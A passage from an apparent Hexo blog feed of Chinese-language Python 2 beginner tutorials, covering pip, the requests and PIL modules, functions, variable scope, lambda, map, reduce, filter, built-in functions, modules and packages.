python-pip</p><p>Windows平台<br>可以下载get-pip.py<br>地址：<a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a><br>然后python get-pip.py</p><p>unix也可以用这种方法, pip install 第三方库的名称</p><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><p>用于程序进行http协议的get和post的模块 </p><h5 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h5><p>尝试获取某个页面，得到了一个请求实例</p><p>#encoding=utf-8<br>import requests<br>url = requests.get(“<a href="http://www.gooann.com&quot;" target="_blank" rel="noopener">http://www.gooann.com&quot;</a>)</p><p>获取cookies       print url.cookies</p><p>获取头部信息        url.headers</p><p>http响应状态码       url.status_code</p><p>网页内容              url.text</p><p>以二进制的方式打开服务器并返回数据      url.content</p><h5 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h5><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}</p><p> r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>, data=payload)</p><p> print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {<br>    “key1”: “value1”,<br>    “key2”: “value2”<br>  },<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “23”,<br>    “Content-Type”: “application/x-www-form-urlencoded”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>没有data参数</p><p>r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>)</p><p>print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {},<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “0”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>当data被赋值了之后，结果中才会多了form值，而form值就是post给服务器的内容</p><h3 id="PIL模块"><a href="#PIL模块" class="headerlink" title="PIL模块"></a>PIL模块</h3><p>python Imaging Library (PIL)是PythonWare公司提供的免费的图像处理工具包，是python下的图像处理模块，支持多种格式，并提供强大的图形与图像处理功能。</p><p>安装：UNIX平台<br>sudo apt-get install python-imaging<br>MAC平台<br>sudo easy_install PIL<br>Windows：<br>去官网直接下载exe安装，傻瓜式操作，传送门:<a href="http://pythonware.com/products/pil/" target="_blank" rel="noopener">http://pythonware.com/products/pil/</a></p><p>#####</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-2</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-2/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-2/</id>
    <published>2018-08-15T07:32:29.000Z</published>
    <updated>2018-08-15T12:40:43.561Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="理解Python函数"><a href="#理解Python函数" class="headerlink" title="理解Python函数"></a>理解Python函数</h1><p>在高中时代，就可以这么定义函数—–f(x)=8x+8 </p><p>在函数中，并没有规定函数是一个数，它可是任何东西，你想是啥就是啥，变量的本质，可以当作一个占位符</p><h1 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h1><p>代码块以 def 关键词开头，def这个简写来自define，后接函数标识符名称和圆括号()。<br>定义函数内容以冒号起始，然后必须缩进（四个空格或者一个tab键）</p><p>def 函数名(参数):<br>        函数体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">def    geturl( ):</span><br><span class="line"></span><br><span class="line">​           print   &quot;get  it&quot;</span><br><span class="line"></span><br><span class="line">geturl( )</span><br></pre></td></tr></table></figure></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>一般情况，要将返回的值传给一个变量，然后通过变量打印出来，如果没有，那就没有回显了</p><h1 id="全局变量and局部变量"><a href="#全局变量and局部变量" class="headerlink" title="全局变量and局部变量"></a>全局变量and局部变量</h1><p>局部变量：只在函数体内（某个范围内）起作用的就叫局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><p>全局变量：在函数的内外都能用，变量前加global<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        global a</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print &quot;---------------&quot;</span><br><span class="line">print &quot;this a is&quot;,a</span><br></pre></td></tr></table></figure></p><h1 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h1><h3 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def add(x,y):</span><br><span class="line">      a = x+y</span><br><span class="line">      print a</span><br><span class="line"></span><br><span class="line">add（3,5）</span><br></pre></td></tr></table></figure><p>引入lambda函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add = lambda  x,y  :  x+y</span><br><span class="line"></span><br><span class="line">add( 3,5 )</span><br></pre></td></tr></table></figure></p><p>lambda函数是一个只用一行就能解决问题的函数。</p><h5 id="lambda函数的使用方法："><a href="#lambda函数的使用方法：" class="headerlink" title="lambda函数的使用方法："></a>lambda函数的使用方法：</h5><p>在lambda函数后面直接加变量，变量后直接冒号，冒号后面是表达式，完美解决<br>来个表达式</p><p>lambda arg1,arg2,….,argn : expression using arguments</p><h3 id="map函数"><a href="#map函数" class="headerlink" title="map函数"></a>map函数</h3><h5 id="使用方法：-map-函数，序列对象"><a href="#使用方法：-map-函数，序列对象" class="headerlink" title="使用方法： map(函数，序列对象)"></a>使用方法： map(函数，序列对象)</h5><p>比如0-100的平方数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(101)</span><br><span class="line"></span><br><span class="line">map( lambda  x :  x**2,numbers)</span><br></pre></td></tr></table></figure></p><p>另一个方法 <code>[ x**2  for  x  in  numbers ]</code></p><h3 id="reduce函数"><a href="#reduce函数" class="headerlink" title="reduce函数"></a>reduce函数</h3><p>reduce()函数也是Python内置的一个高阶函数。</p><p>reduce()函数接收的参数和 map()类似，一个函数 f，一个list，但行为和 map()不同，reduce()传入的函数 f 必须接收两个参数，reduce()对list的每个元素反复调用函数f，并返回最终结果值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def f(x, y):</span><br><span class="line">    return x + y</span><br></pre></td></tr></table></figure></p><p>调用 <strong>reduce(f, [1, 3, 5, 7, 9])</strong>时，reduce函数将做如下计算：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先计算头两个元素：f(1, 3)，结果为4；</span><br><span class="line">再把结果和第3个元素计算：f(4, 5)，结果为9；</span><br><span class="line">再把结果和第4个元素计算：f(9, 7)，结果为16；</span><br><span class="line">再把结果和第5个元素计算：f(16, 9)，结果为25；</span><br><span class="line">由于没有更多的元素了，计算结束，返回结果25。</span><br></pre></td></tr></table></figure></p><p>reduce()还可以接收第3个可选参数，作为计算的初始值。如果把初始值设为100，计算：</p><p>reduce(f, [1,3,5,7,9], 100)</p><p>结果将变为125，因为第一轮计算是：</p><p>计算初始值和第一个元素：f(100, 1)，结果为101。</p><h3 id="filter函数-过滤器"><a href="#filter函数-过滤器" class="headerlink" title="filter函数:过滤器"></a>filter函数:过滤器</h3><h5 id="用法：filter-函数-序列对象"><a href="#用法：filter-函数-序列对象" class="headerlink" title="用法：filter(函数,序列对象)"></a>用法：filter(函数,序列对象)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = range(-2,11)</span><br><span class="line"></span><br><span class="line">print   numbers</span><br><span class="line"></span><br><span class="line">[-2, -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br><span class="line"></span><br><span class="line">filter( lambda x:x&gt;5,numbers)</span><br><span class="line"></span><br><span class="line">[6, 7, 8, 9, 10]</span><br></pre></td></tr></table></figure><h3 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h3><p>zip()是Python的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）。若传入参数的长度不等，则返回list的长度和参数中长度最短的对象相同。利用*号操作符，可以将list unzip（解压）。</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = [1,2,3]</span><br><span class="line"></span><br><span class="line">b = [4,5,6]</span><br><span class="line"></span><br><span class="line"> zip(a,b)</span><br><span class="line"></span><br><span class="line">[(1, 4), (2, 5), (3, 6)]</span><br></pre></td></tr></table></figure></p><h5 id="长度不等时，取长度最小的"><a href="#长度不等时，取长度最小的" class="headerlink" title="长度不等时，取长度最小的"></a>长度不等时，取长度最小的</h5><p>c = ‘HELL0’</p><p> d = ‘look’</p><p>zip(c,d)</p><p>[(‘H’, ‘l’), (‘E’, ‘o’), (‘L’, ‘o’), (‘L’, ‘k’)</p><h5 id="常用的是构造字典"><a href="#常用的是构造字典" class="headerlink" title="常用的是构造字典"></a>常用的是构造字典</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url1 =  [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]</span><br><span class="line"></span><br><span class="line">url2 =  [&apos;d&apos;,&apos;e&apos;,&apos;f&apos;]</span><br><span class="line"></span><br><span class="line">url3 =  zip(url1,url2)</span><br></pre></td></tr></table></figure><h3 id="abs函数"><a href="#abs函数" class="headerlink" title="abs函数"></a>abs函数</h3><h5 id="abs-函数返回数字的绝对值。"><a href="#abs-函数返回数字的绝对值。" class="headerlink" title="abs() 函数返回数字的绝对值。"></a>abs() 函数返回数字的绝对值。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">print &quot;abs(-45) : &quot;, abs(-45)</span><br><span class="line">print &quot;abs(100.12) : &quot;, abs(100.12)</span><br><span class="line">print &quot;abs(119L) : &quot;, abs(119L)</span><br></pre></td></tr></table></figure><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abs(-45) :  45</span><br><span class="line">abs(100.12) :  100.12</span><br><span class="line">abs(119L) :  119</span><br></pre></td></tr></table></figure></p><h3 id="divmod-函数"><a href="#divmod-函数" class="headerlink" title="divmod() 函数"></a>divmod() 函数</h3><p>python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b)。</p><h5 id="divmod-a-b"><a href="#divmod-a-b" class="headerlink" title="divmod(a, b)"></a>divmod(a, b)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">divmod(7, 2)</span><br><span class="line"></span><br><span class="line">(3, 1)</span><br><span class="line"></span><br><span class="line">divmod(8, 2)</span><br><span class="line"></span><br><span class="line">(4, 0)</span><br></pre></td></tr></table></figure><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input() 函数"></a>input() 函数</h3><p>Python3.x 中 input() 函数接受一个标准输入数据，返回为 string 类型。</p><p>Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入。</p><p>注意：input() 和 raw_input() 这两个函数均能接收 字符串 ，但 raw_input() 直接读取控制台的输入（任何类型的输入它都可以接收）除非对 input() 有特别需要，否则一般情况下推荐使用 raw_input() 来与用户交互。</p><h5 id="input-prompt"><a href="#input-prompt" class="headerlink" title="input([prompt])"></a>input([prompt])</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = input(&quot;input:&quot;)</span><br><span class="line"></span><br><span class="line">input:123  </span><br><span class="line"></span><br><span class="line">type(a)   </span><br><span class="line"></span><br><span class="line">type &apos;int&apos;</span><br></pre></td></tr></table></figure><h3 id="open-函数"><a href="#open-函数" class="headerlink" title="open() 函数"></a>open() 函数</h3><p>open() 函数用于打开一个文件，创建一个 file 对象，相关的方法才可以调用它进行读写。</p><h5 id="open（“-name”-”mode”）"><a href="#open（“-name”-”mode”）" class="headerlink" title="open（“$name”,”mode”）"></a>open（“$name”,”mode”）</h5><h5 id="file-对象方法"><a href="#file-对象方法" class="headerlink" title="file 对象方法"></a>file 对象方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">file.read([size]) size未指定则返回整个文件,如果文件大小&gt;2倍内存则有问题.f.read()读到文件尾时返回&quot;&quot;(空字串)</span><br><span class="line"></span><br><span class="line">file.readline() 返回一行</span><br><span class="line"></span><br><span class="line">file.readlines([size]) 返回包含size行的列表,size 未指定则返回全部行</span><br><span class="line"></span><br><span class="line">for line in f: print line #通过循环访问</span><br><span class="line"></span><br><span class="line">f.write(&quot;hello\n&quot;) #如果要写入字符串以外的数据,先将他转换为字符串.</span><br><span class="line"></span><br><span class="line">f.tell() 返回一个整数,表示当前文件指针的位置(就是到文件头的比特数).</span><br><span class="line"></span><br><span class="line">f.close() 关闭文件</span><br></pre></td></tr></table></figure><h3 id="staticmethod-函数"><a href="#staticmethod-函数" class="headerlink" title="staticmethod() 函数"></a>staticmethod() 函数</h3><p>python staticmethod 返回函数的静态方法。</p><p>该方法不强制要求传递参数</p><h3 id="all-函数"><a href="#all-函数" class="headerlink" title="all() 函数"></a>all() 函数</h3><p>all() 函数用于判断给定的可迭代参数 iterable 中的所有元素是否都为 TRUE，如果是返回 True，否则返回 False。</p><p>元素除了是 0、空、FALSE 外都算 TRUE。iterable – 元组或列表。</p><h5 id="比如"><a href="#比如" class="headerlink" title="比如"></a>比如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;])  # 列表list，元素都不为空或0</span><br><span class="line"></span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">all([&apos;a&apos;, &apos;b&apos;, &apos;&apos;, &apos;d&apos;])   # 列表list，存在一个为空的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line">all((0, 1, 2, 3))          # 元组tuple，存在一个为0的元素</span><br><span class="line"></span><br><span class="line">False</span><br><span class="line"></span><br><span class="line"> all([])             # 空列表</span><br><span class="line"></span><br><span class="line">True </span><br><span class="line"></span><br><span class="line">all(())             # 空元组</span><br><span class="line"></span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="enumerate-函数"><a href="#enumerate-函数" class="headerlink" title="enumerate() 函数"></a>enumerate() 函数</h3><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p><p>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seasons = [&apos;Spring&apos;, &apos;Summer&apos;, &apos;Fall&apos;, &apos;Winter&apos;]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons))</span><br><span class="line"></span><br><span class="line">[(0, &apos;Spring&apos;), (1, &apos;Summer&apos;), (2, &apos;Fall&apos;), (3, &apos;Winter&apos;)]</span><br><span class="line"></span><br><span class="line">list(enumerate(seasons, start=1))       # 小标从 1 开始</span><br><span class="line">[(1, &apos;Spring&apos;), (2, &apos;Summer&apos;), (3, &apos;Fall&apos;), (4, &apos;Winter&apos;)]</span><br></pre></td></tr></table></figure></p><h3 id="tuple-方法"><a href="#tuple-方法" class="headerlink" title="tuple()方法"></a>tuple()方法</h3><p>元组 tuple() 函数将列表转换为元组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tuple(&#123;1:2,3:4&#125;)    #针对字典 会返回字典的key组成的tuple</span><br><span class="line"></span><br><span class="line">(1, 3)</span><br><span class="line"></span><br><span class="line">tuple([1,2,3,4])</span><br><span class="line"></span><br><span class="line">(1, 2, 3, 4)</span><br></pre></td></tr></table></figure></p><h3 id="compile-函数"><a href="#compile-函数" class="headerlink" title="compile() 函数"></a>compile() 函数</h3><p>compile() 函数将一个字符串编译为字节代码。</p><h5 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h5><p>返回表达式执行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;3 * 4 + 5&quot;</span><br><span class="line"></span><br><span class="line">a = compile(str,&apos;&apos;,&apos;eval&apos;)</span><br><span class="line"></span><br><span class="line">eval(a)</span><br></pre></td></tr></table></figure></p><h3 id="dict-函数"><a href="#dict-函数" class="headerlink" title="dict() 函数"></a>dict() 函数</h3><p>dict() 函数用于创建一个字典。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dict()                        # 创建空字典</span><br><span class="line"></span><br><span class="line"> dict(a=&apos;a&apos;, b=&apos;b&apos;, t=&apos;t&apos;)     # 传入关键字</span><br><span class="line"></span><br><span class="line">dict(zip([&apos;one&apos;, &apos;two&apos;, &apos;three&apos;], [1, 2, 3]))   # 映射函数方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125; </span><br><span class="line"></span><br><span class="line">dict([(&apos;one&apos;, 1), (&apos;two&apos;, 2), (&apos;three&apos;, 3)])    # 可迭代对象方式来构造字典</span><br><span class="line"></span><br><span class="line">&#123;&apos;three&apos;: 3, &apos;two&apos;: 2, &apos;one&apos;: 1&#125;</span><br></pre></td></tr></table></figure></p><h3 id="file函数"><a href="#file函数" class="headerlink" title="file函数"></a>file函数</h3><p><strong>file()</strong> 函数用于创建一个 file 对象，它有一个别名叫open()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">f = file(&apos;test.txt&apos;)</span><br><span class="line"></span><br><span class="line">f.read()</span><br><span class="line"></span><br><span class="line">&apos;RUNOOB1\nRUNOOB2\n&apos;</span><br></pre></td></tr></table></figure></p><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>在Python中有一个概念叫做模块（module），这个和C语言中的头文件以及Java中的包很类似，比如在Python中要调用sqrt函数，必须用import关键字引入math这个模块</p><h3 id="如何引入模块"><a href="#如何引入模块" class="headerlink" title="如何引入模块"></a>如何引入模块</h3><p>四种方法：</p><h5 id="导入整个模块"><a href="#导入整个模块" class="headerlink" title="导入整个模块"></a>导入整个模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">print sys.argv</span><br></pre></td></tr></table></figure><h5 id="只导入我们要用到的"><a href="#只导入我们要用到的" class="headerlink" title="只导入我们要用到的"></a>只导入我们要用到的</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line"></span><br><span class="line">print argv</span><br></pre></td></tr></table></figure><h5 id="模块名太长，可以起个别名"><a href="#模块名太长，可以起个别名" class="headerlink" title="模块名太长，可以起个别名"></a>模块名太长，可以起个别名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import sys as s</span><br><span class="line"></span><br><span class="line">print s.argv</span><br></pre></td></tr></table></figure><h5 id="从模块中导入所有"><a href="#从模块中导入所有" class="headerlink" title="从模块中导入所有"></a>从模块中导入所有</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from sys import *</span><br><span class="line"></span><br><span class="line">print path #输出sys模块中的path</span><br></pre></td></tr></table></figure><h5 id="定义一个自己的模块"><a href="#定义一个自己的模块" class="headerlink" title="定义一个自己的模块"></a>定义一个自己的模块</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在目录下创建一个myself.py作为模块</span><br><span class="line"></span><br><span class="line">#encoding=utf-8</span><br><span class="line">a =  &quot;just do it&quot;</span><br></pre></td></tr></table></figure><p>接下来，创建一个py，引入这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">import myself</span><br><span class="line">print myself.a</span><br></pre></td></tr></table></figure></p><p>如果在不同目录下，就要用到sys模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> import sys</span><br><span class="line"></span><br><span class="line">sys.path.append(&quot;C:\Users\20148\Desktop\myself.py&quot;)</span><br></pre></td></tr></table></figure></p><p>用这种方法告诉Python解释器，我写的文件在哪里</p><p>可以将myself.py改造为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        return &quot;just  do it!!!&quot;</span><br><span class="line"></span><br><span class="line">if ____name__ _== &apos;__main__&apos;:</span><br><span class="line">        print  a()</span><br></pre></td></tr></table></figure></p><p>都是一个文件，我们可以把他当作程序执行，也可以当作模块引入</p><p>如果是程序执行的话，<code>__name__==&quot;__main__&quot;</code></p><p>如果是模块呢？<code>demo.__name__==“demo”</code>，即为模块的名称</p><p>如果是模块的引入，就不用写<code>if __name==&quot;__main__&quot;</code>了</p><h1 id="包and库"><a href="#包and库" class="headerlink" title="包and库"></a>包and库</h1><p>包(带 <strong>init</strong>.py 的文件夹)，一个包（就是熟悉的目录）里面有好多的模块（即为.py文件），库就更大了，一个Python的标准库有好多的包，包又有一堆的模块</p><p>建立一个叫gooann的目录，里面放两个py文件，一个a.py，一个b.py，再建立一个空文件<strong>init</strong>.py<br>a.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  a():</span><br><span class="line">        print &apos;just  do it!!!&apos;</span><br></pre></td></tr></table></figure></p><p>b.py源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">def  b():</span><br><span class="line">        print &apos;hello world!!&apos;</span><br></pre></td></tr></table></figure></p><p>然后，在与gooann同级的目录中，创建一个c.py调用这个gooann的包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">import  gooann.a</span><br><span class="line">import  gooann.b</span><br><span class="line"></span><br><span class="line">gooann.a.a( )</span><br><span class="line"></span><br><span class="line">gooann.b.b( )</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-1</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-1/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-1/</id>
    <published>2018-08-15T07:25:45.000Z</published>
    <updated>2018-08-15T12:44:11.792Z</updated>
    
